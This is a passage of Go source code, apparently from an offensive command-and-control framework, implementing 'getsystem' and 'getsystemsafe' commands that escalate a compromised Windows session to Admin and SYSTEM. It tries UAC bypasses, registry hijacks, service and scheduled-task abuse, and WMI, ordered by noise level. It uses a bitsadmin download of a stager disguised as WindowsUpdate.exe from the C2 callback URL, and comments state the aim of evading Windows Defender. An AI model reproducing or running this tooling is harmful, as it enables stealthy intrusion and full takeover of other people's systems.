					Parameters: map[string]interface{}{"session_id": sessionID},
				}
				is.server.EnqueueTask(task)

				// Determine timeout based on command type
				timeout := 10 * time.Second
				if strings.Contains(cmd, "schtasks") {
					timeout = 10 * time.Second
				} else if strings.Contains(cmd, "sc ") {
					timeout = 10 * time.Second
				} else if strings.Contains(cmd, "reg") {
					timeout = 5 * time.Second
				} else if strings.Contains(cmd, "ping") {
					timeout = 5 * time.Second
				} else if strings.Contains(cmd, "cmstp") {
					timeout = 15 * time.Second
				} else if strings.Contains(cmd, "wmic") {
					timeout = 10 * time.Second
				}

				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)

				// Check command result for errors
				taskResult := is.taskQueue.Get(taskID)
				if taskResult != nil && taskResult.Status == "completed" {
					// Check for common error patterns
					var output string
					if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
						if resultValue, ok := resultMap["result"].(string); ok {
							output = resultValue
							errorLower := strings.ToLower(output)
							// Check WMI ReturnValue
							if strings.Contains(cmd, "wmic") && strings.Contains(errorLower, "returnvalue") {
								if strings.Contains(errorLower, "returnvalue.*=.*9") || strings.Contains(errorLower, "returnvalue = 9") {
									if idx < 2 {
										fmt.Printf("[!] Command failed: %s\n", cmd)
										commandFailed = true
										break
									}
								}
							}
							// Check for critical errors that indicate command failure
							if strings.Contains(errorLower, "access is denied") ||
								strings.Contains(errorLower, "failed") ||
								strings.Contains(errorLower, "error") ||
								strings.Contains(errorLower, "invalid syntax") {
								// Only fail on critical commands (first few), allow cleanup to proceed
								if idx < 2 {
									fmt.Printf("[!] Command failed: %s\n", cmd)
									commandFailed = true
									break
								}
							}
							// Check for CheckResult pattern if specified
							if method.CheckResult != "" {
								matched, _ := regexp.MatchString(method.CheckResult, output)
								if !matched && idx < 2 {
									fmt.Printf("[!] Command output validation failed: %s\n", cmd)
									commandFailed = true
									break
								}
							}
						}
					}
				} else if taskResult != nil && taskResult.Status == "failed" {
					// Critical command failed
					if idx < 2 {
						fmt.Printf("[!] Command execution failed: %s\n", cmd)
						commandFailed = true
						break
					}
				}
			}

			if commandFailed {
				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
				continue
			}

			// Wait for escalation to take effect - use polling instead of fixed sleep
			fmt.Printf("[*] Waiting for new SYSTEM session to connect...\n")
			newSession := is.waitForSessionWithPrivilege(core.PrivilegeSystem, 10*time.Second, sessionID)
			if newSession != nil {
				fmt.Printf("[+] Successfully escalated to SYSTEM using %s!\n", method.Name)
				fmt.Printf("[+] New SYSTEM session: %s\n", newSession.ID)
				escalatedToSystem = true
			}

			if escalatedToSystem {
				break
			}

			fmt.Printf("[!] Method %s did not produce SYSTEM session, trying next...\n", method.Name)
		}

		if !escalatedToSystem {
			return fmt.Errorf("failed to escalate from Admin to SYSTEM using LOLBins: all %d methods failed", len(methods))
		}
	}

	// Step 4: Spawn new beacon as SYSTEM
	fmt.Printf("[*] Step 4: Spawning new beacon as SYSTEM...\n")
	err = is.spawnElevatedBeacon(sessionID, core.PrivilegeSystem)
	if err != nil {
		return fmt.Errorf("failed to spawn SYSTEM beacon: %v", err)
	}

	fmt.Printf("[+] Automated privilege escalation complete!\n")
	fmt.Printf("[+] A new SYSTEM session should appear shortly. Check 'sessions' command.\n")
	return nil
}

// executeGetSystemSafe performs stealthy privilege escalation using only LOLBins and native Windows tools
// This avoids PowerShell modules and suspicious behavior patterns to evade Windows Defender
func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	// Validate session exists
	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	// Check if Windows session
	transportType := session.Transport
	if transportType != "http" && transportType != "https" {
		if osInfo, ok := session.GetMetadata("os"); ok {
			if osStr, ok := osInfo.(string); ok {
				if !strings.Contains(strings.ToLower(osStr), "windows") {
					return fmt.Errorf("getsystemsafe is only supported on Windows")
				}
			}
		}
	}

	fmt.Printf("[*] Starting stealthy privilege escalation (LOLBin-only)...\n")
	fmt.Printf("[*] Using native Windows tools only - no PowerShell modules\n")

	lolbinEsc := &privesc.LOLBinEscalation{}

	// Step 1: Detect privilege level using native commands
	fmt.Printf("[*] Step 1: Detecting privilege level (using native 'whoami' command)...\n")
	currentPriv, username, err := is.detectPrivilegeLevelLOLBin(sessionID)
	if err != nil {
		return fmt.Errorf("failed to detect privilege level: %v", err)
	}

	// Update session with detected info
	if username != "" {
		session.SetUsername(username)
		session.SetPrivilegeLevel(currentPriv)
		session.SetMetadata("username", username)
		session.SetMetadata("privilege_level", string(currentPriv))
	}

	fmt.Printf("[+] Current user: %s (Privilege: %s)\n", username, currentPriv)

	// Step 1.5: Try AccessChk discovery (if available) - graceful degradation
	fmt.Printf("[*] Step 1.5: Attempting AccessChk discovery (optional, graceful degradation if unavailable)...\n")
	accessChkOutput, err := is.executeAccessChk(sessionID)
	if err == nil && accessChkOutput != "" {
		fmt.Printf("[+] AccessChk discovery completed\n")
		matches, err := is.privescIntelligence.AnalyzeAccessChkOutput(accessChkOutput)
		if err == nil && len(matches) > 0 {
			fmt.Printf("[+] Found %d exploitable permissions via AccessChk\n", len(matches))
			// Log findings for intelligence purposes
			for _, match := range matches {
				if match.Confidence == "High" {
					fmt.Printf("    [HIGH] %s: %s\n", match.Name, match.Reason)
				}
			}
		}
	} else {
		fmt.Printf("[!] AccessChk not available - continuing with LOLBin-only methods (graceful degradation)\n")
	}

	// Step 2: If user, escalate to admin using LOLBins
	if currentPriv == core.PrivilegeUser {
		fmt.Printf("[*] Step 2: User -> Admin escalation (using LOLBins)...\n")
		fmt.Printf("[*] Trying stealthy UAC bypass methods in order of stealth...\n")

		methods := lolbinEsc.GetUserToAdminMethods()
		// Sort by noise level (Low first)
		sort.Slice(methods, func(i, j int) bool {
			noiseMap := map[string]int{"Low": 1, "Medium": 2, "High": 3}
			return noiseMap[methods[i].NoiseLevel] < noiseMap[methods[j].NoiseLevel]
		})

		escalatedToAdmin := false
		for i, method := range methods {
			fmt.Printf("[*] Trying method %d/%d: %s (Noise: %s)\n", i+1, len(methods), method.Name, method.NoiseLevel)

			// Get callback URL for spawn command
			callbackURL := is.getCallbackURL(session)
			if callbackURL == "" {
				return fmt.Errorf("could not determine callback URL")
			}

			// Generate spawn command using LOLBins
			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "admin")

			// Execute method commands with proper timing and error checking
			commandFailed := false
			for idx, cmdTemplate := range method.Commands {
				// Properly escape spawnCmd based on command type to avoid nested quote issues
				var cmd string
				if strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) {
					// For reg add /d, we need to escape quotes
					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/tr "%s"`) {
					// For schtasks /tr, we need to escape quotes
					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`) {
					// For schtasks /change /tr, we need to escape quotes
					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`) {
					// For sc binPath=, we need to escape quotes
					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else {
					// For other commands, use spawnCmd as-is
					cmd = fmt.Sprintf(cmdTemplate, spawnCmd)
				}

				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
				task := &tasks.Task{
					ID:         taskID,
					Type:       "shell",
					Command:    cmd,
					Parameters: map[string]interface{}{"session_id": sessionID},
				}
				is.server.EnqueueTask(task)

				// Determine timeout based on command type
				timeout := 10 * time.Second
				if strings.Contains(cmd, "schtasks") {
					timeout = 10 * time.Second
				} else if strings.Contains(cmd, "sc ") {
					timeout = 10 * time.Second
				} else if strings.Contains(cmd, "reg") {
					timeout = 5 * time.Second
				} else if strings.Contains(cmd, "ping") {
					timeout = 5 * time.Second
				} else if strings.Contains(cmd, "cmstp") {
					timeout = 15 * time.Second
				}

				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)

				// Check command result for errors
				taskResult := is.taskQueue.Get(taskID)
				if taskResult != nil && taskResult.Status == "completed" {
					// Check for common error patterns
					var output string
					if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
						if resultValue, ok := resultMap["result"].(string); ok {
							output = resultValue
							errorLower := strings.ToLower(output)
							// Check for critical errors that indicate command failure
							if strings.Contains(errorLower, "access is denied") ||
								strings.Contains(errorLower, "failed") ||
								strings.Contains(errorLower, "error") ||
								strings.Contains(errorLower, "invalid syntax") {
								// Only fail on critical commands (first few), allow cleanup to proceed
								if idx < 2 {
									fmt.Printf("[!] Command failed: %s\n", cmd)
									commandFailed = true
									break
								}
							}
						}
					}
				} else if taskResult != nil && taskResult.Status == "failed" {
					// Critical command failed
					if idx < 2 {
						fmt.Printf("[!] Command execution failed: %s\n", cmd)
						commandFailed = true
						break
					}
				}
			}

			if commandFailed {
				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
				continue
			}

			// Wait for escalation to take effect - use polling instead of fixed sleep
			// Registry hijack methods spawn NEW elevated processes (eventvwr.exe, fodhelper.exe, etc.)
			// These processes will execute our spawn command, which downloads and runs a new beacon
			// We need to wait for the new beacon to connect, then check if it's admin
			fmt.Printf("[*] Waiting for elevated process to spawn new beacon...\n")
			newAdminSession := is.waitForSessionWithPrivilege(core.PrivilegeAdmin, 10*time.Second, sessionID)

			// Check if a new Admin session appeared (the spawned process should connect as admin)
			foundAdminSession := false
			if newAdminSession != nil {
				fmt.Printf("[+] New Admin session detected: %s (from %s method)\n", shortID(newAdminSession.ID), method.Name)
				// Update original session privilege level for tracking
				session.SetPrivilegeLevel(core.PrivilegeAdmin)
				session.SetMetadata("privilege_level", "admin")
				escalatedToAdmin = true
				currentPriv = core.PrivilegeAdmin
				foundAdminSession = true
			}

			// Also check if current session got elevated (some methods might elevate in-place)
			if !foundAdminSession {
				newPriv, _, err := is.detectPrivilegeLevelLOLBin(sessionID)
				if err == nil && newPriv == core.PrivilegeAdmin {
					fmt.Printf("[+] Successfully escalated current session to Admin using %s!\n", method.Name)
					session.SetPrivilegeLevel(core.PrivilegeAdmin)
					session.SetMetadata("privilege_level", "admin")
					escalatedToAdmin = true
					currentPriv = core.PrivilegeAdmin
					foundAdminSession = true
				}
			}

			if foundAdminSession {
				// Cleanup registry keys (non-blocking, errors are OK)
				fmt.Printf("[*] Cleaning up registry modifications...\n")
				for _, cleanupCmd := range lolbinEsc.CleanupRegistryKeys() {
					cleanupTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
					cleanupTask := &tasks.Task{
						ID:         cleanupTaskID,
						Type:       "shell",
						Command:    cleanupCmd,
						Parameters: map[string]interface{}{"session_id": sessionID},
					}
					is.server.EnqueueTask(cleanupTask)
					// Don't wait for cleanup - it's best-effort
				}
				break
			} else {
				// Method failed - try next one
				fmt.Printf("[!] Method %s did not result in Admin privileges, trying next...\n", method.Name)
				// Cleanup registry modifications from failed attempt
				for _, cleanupCmd := range lolbinEsc.CleanupRegistryKeys() {
					cleanupTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
					cleanupTask := &tasks.Task{
						ID:         cleanupTaskID,
						Type:       "shell",
						Command:    cleanupCmd,
						Parameters: map[string]interface{}{"session_id": sessionID},
					}
					is.server.EnqueueTask(cleanupTask)
				}
				time.Sleep(2 * time.Second) // Brief pause between attempts
			}
		}

		if !escalatedToAdmin {
			return fmt.Errorf("failed to escalate from User to Admin using LOLBins: all %d methods failed", len(methods))
		}
	}

	// Step 3: If admin, escalate to SYSTEM using LOLBins
	if currentPriv == core.PrivilegeAdmin {
		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation (using LOLBins)...\n")

		methods := lolbinEsc.GetAdminToSystemMethods()
		// Sort by noise level (Low first)
		sort.Slice(methods, func(i, j int) bool {
			noiseMap := map[string]int{"Low": 1, "Medium": 2, "High": 3}
			return noiseMap[methods[i].NoiseLevel] < noiseMap[methods[j].NoiseLevel]
		})

		escalatedToSystem := false
		for i, method := range methods {
			fmt.Printf("[*] Trying method %d/%d: %s (Noise: %s)\n", i+1, len(methods), method.Name, method.NoiseLevel)

			// Get callback URL for spawn command
			callbackURL := is.getCallbackURL(session)
			if callbackURL == "" {
				return fmt.Errorf("could not determine callback URL")
			}

			// Generate spawn command using LOLBins
			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
			// Escape % signs in spawnCmd so fmt.Sprintf doesn't interpret them
			spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)

			// Execute method commands with proper timing and error checking
			commandFailed := false
			for idx, cmdTemplate := range method.Commands {
				// Detect what type of command this is and handle accordingly
				var cmd string

				// Check if this is a copy command that needs a file path
				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) &&
					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) ||
						strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))

				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%W`)

				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)

				isSchTasksTr := strings.Contains(cmdTemplate, `schtasks`) && (strings.Contains(cmdTemplate, `/tr "%s"`) || (strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`)))

				isSchTasksXml := strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/xml "%s"`)

				isRegAddD := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) && !isRegImagePath

				isScCreate := strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`)

				isScConfig := strings.Contains(cmdTemplate, `sc config`) && strings.Contains(cmdTemplate, `binPath= "%s"`)

				isWmic := strings.Contains(cmdTemplate, `wmic`) && strings.Contains(cmdTemplate, `%s`)

				if isCopyCommand {
					// For copy commands, we need to download the file first, then copy it
					hasDownloaded := false
					for j := 0; j < idx; j++ {
						if strings.Contains(method.Commands[j], `bitsadmin`) || strings.Contains(method.Commands[j], `download`) {
							hasDownloaded = true
							break
						}
					}

					if !hasDownloaded {
						// First copy command - download the file first
						filePath := `%TEMP%\WindowsUpdate.exe`
						downloadCmd := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s`, callbackURL, filePath)
						downloadTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
						downloadTask := &tasks.Task{
							ID:         downloadTaskID,
							Type:       "shell",
							Command:    downloadCmd,
							Parameters: map[string]interface{}{"session_id": sessionID},
						}
						is.server.EnqueueTask(downloadTask)
						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
					}

					filePath := `%TEMP%\WindowsUpdate.exe`
					cmd = fmt.Sprintf(cmdTemplate, filePath)
				} else if isDelCommand {
					// For del commands, use template as-is (no %s placeholder)
					if strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `Program Files`) {
						cmd = cmdTemplate // Template already has correct path
					} else {
						filePath := `%TEMP%\WindowsUpdate.exe`
						cmd = fmt.Sprintf(cmdTemplate, filePath)
					}
				} else if isSchTasksTr {
					// For schtasks /tr, we need to pass the command directly without cmd.exe /c wrapper
					// schtasks interprets /c as its own option if we wrap it
					spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
					spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)
					// Escape quotes for nested command
					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isSchTasksXml {
					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
					commandFailed = true
					break
				} else if isRegAddD {
					// For reg add /d, we need to escape quotes properly
					// reg add expects the value to be in quotes, so we escape internal quotes
					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isRegImagePath {
					// For reg add ImagePath, wrap in cmd.exe /c
					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isScCreate || isScConfig {
					// For sc create/config binPath=, we need to escape quotes properly
					// sc config expects binPath= "path" format, so we escape internal quotes
					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
					// Escape quotes - need to escape \" for Windows
					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isWmic {
					// For wmic, wrap in cmd.exe /c
					// Some WMI commands have multiple %s placeholders (e.g., CommandLineEventConsumer)
					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
					// Count %s placeholders
					placeholderCount := strings.Count(cmdTemplate, `%s`)
					if placeholderCount == 2 {
						// Two placeholders - use same command for both
						cmd = strings.Replace(cmdTemplate, `%s`, spawnCmdForExecEscaped, 2)
					} else {
						cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
					}
				} else {
					// For other commands, check if template has %s placeholder
					if strings.Contains(cmdTemplate, `%s`) {
						cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
					} else {
						// Template doesn't have %s, use as-is (may have %% for environment variables)
						cmd = cmdTemplate
					}
				}
				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
				task := &tasks.Task{
					ID:         taskID,
					Type:       "shell",
					Command:    cmd,
					Parameters: map[string]interface{}{"session_id": sessionID},
				}
				is.server.EnqueueTask(task)

				// Determine timeout based on command type
				timeout := 10 * time.Second
				if strings.Contains(cmd, "schtasks") {
					timeout = 10 * time.Second
				} else if strings.Contains(cmd, "sc ") {
					timeout = 10 * time.Second
				} else if strings.Contains(cmd, "wmic") {
					timeout = 15 * time.Second
				} else if strings.Contains(cmd, "ping") {
					timeout = 5 * time.Second
				}

				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)

				// Check command result for errors
				taskResult := is.taskQueue.Get(taskID)
				if taskResult != nil && taskResult.Status == "completed" {
					// Check for WMI ReturnValue errors
					if strings.Contains(cmd, "wmic") && method.CheckResult != "" {
						var output string
						if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
							if resultValue, ok := resultMap["result"].(string); ok {
								output = resultValue
							}
						}
						// Check if ReturnValue is not 0 (success)
						if strings.Contains(output, "ReturnValue") && !strings.Contains(output, "ReturnValue = 0") {
							fmt.Printf("[!] WMI command failed (non-zero ReturnValue detected)\n")
							commandFailed = true
							break
						}
					}

					// Check for common error patterns
					var output string
					if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
						if resultValue, ok := resultMap["result"].(string); ok {
							output = resultValue
							errorLower := strings.ToLower(output)
							// Check for critical errors that indicate command failure
							if strings.Contains(errorLower, "access is denied") ||
								strings.Contains(errorLower, "failed") ||
								strings.Contains(errorLower, "error") ||
								strings.Contains(errorLower, "invalid syntax") {
								// Only fail on critical commands (first few), allow cleanup to proceed
								if idx < 2 {
									fmt.Printf("[!] Command failed: %s\n", cmd)
									commandFailed = true
									break
								}
							}
						}
					}
				} else if taskResult != nil && taskResult.Status == "failed" {
					// Critical command failed
					if idx < 2 {
						fmt.Printf("[!] Command execution failed: %s\n", cmd)
						commandFailed = true
						break
					}
				}
			}

			if commandFailed {
				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
				continue
			}

			// Wait for new SYSTEM session to connect (spawned process needs time to beacon)
			fmt.Printf("[*] Waiting for new SYSTEM session to connect...\n")
			newSystemSession := is.waitForSessionWithPrivilege(core.PrivilegeSystem, 10*time.Second, sessionID)
			if newSystemSession != nil {
				fmt.Printf("[+] New SYSTEM session detected: %s\n", shortID(newSystemSession.ID))
				escalatedToSystem = true
				break
			} else {
				fmt.Printf("[!] Method %s did not produce SYSTEM session, trying next...\n", method.Name)
				// Brief pause between attempts - acceptable for user feedback
				time.Sleep(500 * time.Millisecond)
			}
		}

		if !escalatedToSystem {
			return fmt.Errorf("failed to escalate from Admin to SYSTEM using LOLBins")
		}
	}

	fmt.Printf("[+] Stealthy privilege escalation complete!\n")
	fmt.Printf("[+] A new elevated session should appear shortly. Check 'sessions' command.\n")
	fmt.Printf("[*] Note: This method uses only native Windows tools (LOLBins) to avoid detection\n")
	return nil
}

// detectPrivilegeLevelLOLBin detects privilege level using only native Windows commands
func (is *InteractiveServer) detectPrivilegeLevelLOLBin(sessionID string) (core.PrivilegeLevel, string, error) {
	// Use native whoami command instead of PowerShell
	params := map[string]interface{}{
		"session_id": sessionID,
	}

	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:         taskID,
		Type:       "shell",
		Command:    "whoami /groups",
		Parameters: params,
	}
	is.server.EnqueueTask(task)

	// Wait for result
	is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)

	whoamiTask := is.taskQueue.Get(taskID)
	if whoamiTask == nil || whoamiTask.Status != "completed" {
		// Fallback: try whoami without /groups
		taskID2 := fmt.Sprintf("task-%d", time.Now().UnixNano())
		task2 := &tasks.Task{
			ID:         taskID2,
			Type:       "shell",
			Command:    "whoami",
			Parameters: params,
		}
		is.server.EnqueueTask(task2)
		is.pollTaskResultWithTimeout(sessionID, taskID2, 10*time.Second)
		whoamiTask = is.taskQueue.Get(taskID2)
	}

	if whoamiTask == nil || whoamiTask.Status != "completed" {
		return core.PrivilegeUnknown, "", fmt.Errorf("failed to execute whoami command")
	}

	var output string
	if whoamiTask.Result != nil {
		if resultMap, ok := whoamiTask.Result.(map[string]interface{}); ok {
			if resultValue, ok := resultMap["result"].(string); ok {
				output = resultValue
			}
		}
	}

	// Use LOLBin escalation helper to parse
	lolbinEsc := &privesc.LOLBinEscalation{}
	privLevel, username := lolbinEsc.DetectPrivilegeLevel(output)

	var privLevelEnum core.PrivilegeLevel
	switch privLevel {
	case "system":
		privLevelEnum = core.PrivilegeSystem
	case "admin":
		privLevelEnum = core.PrivilegeAdmin
	default:
		privLevelEnum = core.PrivilegeUser
	}

	return privLevelEnum, username, nil
}

// executeGetPrivs displays the current privilege level and username of the session
func (is *InteractiveServer) executeGetPrivs(sessionID string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	// Validate session exists
	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	// Get current privilege level from session (if already detected)
	currentPriv := session.GetPrivilegeLevel()
	username := session.GetUsername()

	// If not already detected, detect it now
	if currentPriv == core.PrivilegeUnknown || username == "" {
		fmt.Printf("[*] Detecting privilege level...\n")
		var err error
		currentPriv, username, err = is.detectPrivilegeLevelLOLBin(sessionID)
		if err != nil {
			// Fallback to PowerShell-based detection
			currentPriv, username, err = is.detectPrivilegeLevel(sessionID)
			if err != nil {
				return fmt.Errorf("failed to detect privilege level: %v", err)
			}
		}

		// Update session with detected info
		session.SetPrivilegeLevel(currentPriv)
		session.SetUsername(username)
		session.SetMetadata("privilege_level", string(currentPriv))
		session.SetMetadata("username", username)
	}

	// Display privilege information with color coding
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("PRIVILEGE INFORMATION")
	fmt.Println(strings.Repeat("=", 60))

	// Color code based on privilege level
	var privColor, resetColor string
	switch currentPriv {
	case core.PrivilegeSystem:
		privColor = "\033[35m" // Magenta
	case core.PrivilegeAdmin:
		privColor = "\033[33m" // Yellow
	case core.PrivilegeUser:
		privColor = "\033[36m" // Cyan
	default:
		privColor = "\033[90m" // Gray
	}
	resetColor = "\033[0m"

	fmt.Printf("Username:  %s\n", username)
	fmt.Printf("Privilege: %s%s%s\n", privColor, strings.ToUpper(string(currentPriv)), resetColor)

	// Add helpful context
	switch currentPriv {
	case core.PrivilegeSystem:
		fmt.Println("\n[+] You have SYSTEM privileges - highest level access")
	case core.PrivilegeAdmin:
		fmt.Println("\n[*] You have Administrator privileges")
		fmt.Println("[*] Use 'getsystem' or 'getsystemsafe' to escalate to SYSTEM")
	case core.PrivilegeUser:
		fmt.Println("\n[*] You have User privileges")
		fmt.Println("[*] Use 'getsystem' or 'getsystemsafe' to escalate to Admin/System")
	default:
		fmt.Println("\n[!] Privilege level could not be determined")
	}

	fmt.Println(strings.Repeat("=", 60) + "\n")

	return nil
}

// getCallbackURL extracts callback URL from session
func (is *InteractiveServer) getCallbackURL(session *core.Session) string {
	callbackURL := ""
	if session.Transport == "http" || session.Transport == "https" {
		if callbackMeta, ok := session.GetMetadata("callback_url"); ok {
			if callbackStr, ok := callbackMeta.(string); ok {
				callbackURL = callbackStr
			}
		}
		if callbackURL == "" {
			if is.config != nil {
				protocol := "http"
				if is.config.Server.TLSEnabled {
					protocol = "https"
				}
				callbackURL = fmt.Sprintf("%s://%s:%d",
					protocol,
					is.config.Server.Host,
					is.config.Server.Port)
			}
		}
	}
	return callbackURL
}

// executeAccessChk runs AccessChk to discover weak permissions
// Returns combined output from multiple AccessChk scans
func (is *InteractiveServer) executeAccessChk(sessionID string) (string, error) {
	if is.server == nil {
		return "", fmt.Errorf("server not initialized")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return "", fmt.Errorf("session not found: %s", shortID(sessionID))
	}

	params := map[string]interface{}{
		"session_id": sessionID,
	}

	var combinedOutput strings.Builder

	// Command 1: Find services with weak permissions
	// Note: AccessChk may not be available, so we'll try and handle gracefully
	fmt.Printf("[*] Running AccessChk to find weak service permissions...\n")
	taskID1 := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task1 := &tasks.Task{
		ID:         taskID1,
		Type:       "shell",
		Command:    `accesschk.exe -wsvc * 2>&1`,
		Parameters: params,
	}
	is.server.EnqueueTask(task1)
	is.pollTaskResultWithTimeout(sessionID, taskID1, 30*time.Second)
	task1Result := is.taskQueue.Get(taskID1)
	if task1Result != nil && task1Result.Status == "completed" {
		if resultMap, ok := task1Result.Result.(map[string]interface{}); ok {
			if resultValue, ok := resultMap["result"].(string); ok {
				combinedOutput.WriteString("=== Weak Service Permissions (-wsvc *) ===\n")
				combinedOutput.WriteString(resultValue)
				combinedOutput.WriteString("\n\n")
			}
		}
	}

	// Command 2: Find objects writable by Users group
	fmt.Printf("[*] Running AccessChk to find objects writable by Users group...\n")
	taskID2 := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task2 := &tasks.Task{
		ID:         taskID2,
		Type:       "shell",
		Command:    `accesschk.exe -wus "Users" %windir% 2>&1`,
		Parameters: params,
	}
	is.server.EnqueueTask(task2)
	is.pollTaskResultWithTimeout(sessionID, taskID2, 30*time.Second)
	task2Result := is.taskQueue.Get(taskID2)
	if task2Result != nil && task2Result.Status == "completed" {
		if resultMap, ok := task2Result.Result.(map[string]interface{}); ok {
			if resultValue, ok := resultMap["result"].(string); ok {
				combinedOutput.WriteString("=== Writable Objects by Users (%windir%) ===\n")
				combinedOutput.WriteString(resultValue)
				combinedOutput.WriteString("\n\n")
			}
		}
	}

	output := combinedOutput.String()
	if output == "" {
		return "", fmt.Errorf("AccessChk not available or returned no output. Tool may need to be downloaded.")
	}

	// Check if AccessChk is available (common error messages)
	if strings.Contains(strings.ToLower(output), "not recognized") ||
		strings.Contains(strings.ToLower(output), "not found") ||
		strings.Contains(strings.ToLower(output), "cannot find") {
		is.logger.Warn("AccessChk not available on target system")
		return "", fmt.Errorf("AccessChk not available on target system")
	}

	return output, nil
}

// executeAccessChkNamedPipes enumerates named pipes with weak permissions using AccessChk
func (is *InteractiveServer) executeAccessChkNamedPipes(sessionID string) ([]string, error) {
	if is.server == nil {
		return nil, fmt.Errorf("server not initialized")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return nil, fmt.Errorf("session not found: %s", shortID(sessionID))
	}

	params := map[string]interface{}{
		"session_id": sessionID,
	}

	// Run AccessChk to find named pipes with write permissions
	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:         taskID,
		Type:       "shell",
		Command:    `accesschk.exe -w \pipe\* 2>&1`,
		Parameters: params,
	}
	is.server.EnqueueTask(task)
	is.pollTaskResultWithTimeout(sessionID, taskID, 30*time.Second)

	taskResult := is.taskQueue.Get(taskID)
	if taskResult == nil || taskResult.Status != "completed" {
